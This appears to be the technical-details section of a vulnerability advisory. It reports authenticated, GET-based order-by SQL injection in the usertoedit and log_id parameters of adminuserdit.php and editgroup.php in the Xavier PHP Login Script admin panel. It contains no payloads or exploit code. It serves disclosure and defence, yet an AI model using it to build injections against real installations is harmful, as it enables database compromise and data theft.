Technical Details & Description:
================================
Multiple sql-injection vulnerabilities has been discovered in the Xavier PHP Login Script & User Management Admin Panel web-application.
The issue allows remote attackers to inject own malicious sql commands to compromise the web-application & database management system.
 
The sql-injection vulnerabilities are located in the `usertoedit` and `log_id` parameters of the `adminuserdit.php` and `editgroup.php` files.
Remote attackers with privileged user accounts are able to compromise the web-application and database management system by injection of sql 
commands via GET method request. The attacker vector is client-side and the request method to inject the sql commands is GET. The vulnerability 
is a classic order by sql-injection.
 
The security risk of the sql-injection web vulnerability is estimated as medium with a common vulnerability scoring system count of 5.3. 
Exploitation of the remote sql-injection web vulnerability requires an authenticated web-application user account and no user interaction. 
Successful exploitation of the sql-injection web vulnerability results in web-application or database management system compromise.
